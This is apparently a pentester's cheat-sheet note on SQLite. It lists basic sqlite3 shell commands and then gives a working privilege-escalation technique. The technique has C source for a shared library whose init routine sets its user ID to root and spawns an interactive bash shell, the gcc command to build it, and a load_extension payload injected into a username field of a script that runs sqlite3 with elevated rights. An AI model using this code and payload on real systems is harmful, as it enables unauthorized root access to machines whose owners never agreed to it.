# SQLite

# Commands
```bash
# Open DB file
.open <your_file.db>

# List databases
.databases

# List tables
.tables

# Structure of table
.schema <table>
```

# Command Execution
## load_extension
Suppose we're on Linux and there's a bash script which asks for a username that will be used to activate the user.

The commands looks like this: 
```bash
/usr/bin/sqlite3 db.sqlite3 -line \'UPDATE accounts_customuser SET is_active=1 WHERE username=\"%s\";\'
```
We need to create a `.c` script that we compile into a library.
```c
// test.c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```
```bash
gcc -shared -fPIC -nostartfiles -o test.so test.c
```
This library will spawn an elevated shell.

For this to work we're going to create a payload that we'll feed to the script. Once the script reaches the point where the username
is used in the sql statement, a shell with elevated privileges will be spawned.
```
"+load_extension('test.so')+"
```